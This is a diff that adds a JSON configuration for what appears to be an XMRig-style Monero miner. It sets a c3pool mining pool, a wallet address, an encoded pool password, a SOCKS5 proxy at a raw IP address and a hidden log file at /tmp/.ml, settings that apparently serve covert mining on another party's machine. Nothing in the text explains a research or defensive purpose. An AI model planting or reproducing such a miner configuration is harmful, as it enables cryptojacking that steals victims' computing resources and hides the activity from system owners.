@@ -1,0 +1,32 @@
+{
+  "autosave": false,
+  "opencl": false,
+  "cuda": false,
+  "donate-level": 1,
+  "syslog": false,
+  "colors": false,
+  "log-file": "/tmp/.ml",
+  "pools": [
+    {
+      "coin": null,
+      "algo": null,
+      "url": "mine.c3pool.com:13333",
+      "user": "45bDhnWqGBiQqt34UeYaKdBJHWYANWT5wLyNCRMvbnphieGmvdzak37LNgt4hY7cxkMZYkLyWgyKu4AE34kKNLGrEQAc7oy",
+      "pass": "aN0YgphtHFaPLzhYOXA2rw==",
+      "tls": false,
+      "keepalive": true,
+      "socks5": "52.59.250.209:10080",
+      "nicehash": false
+    }
+  ],
+  "cpu": {
+    "*": {
+      "intensity": 1,
+      "threads": -1,
+      "affinity": -1
+    }
+  },
+  "randomx": {
+    "init": -1
+  }
+}
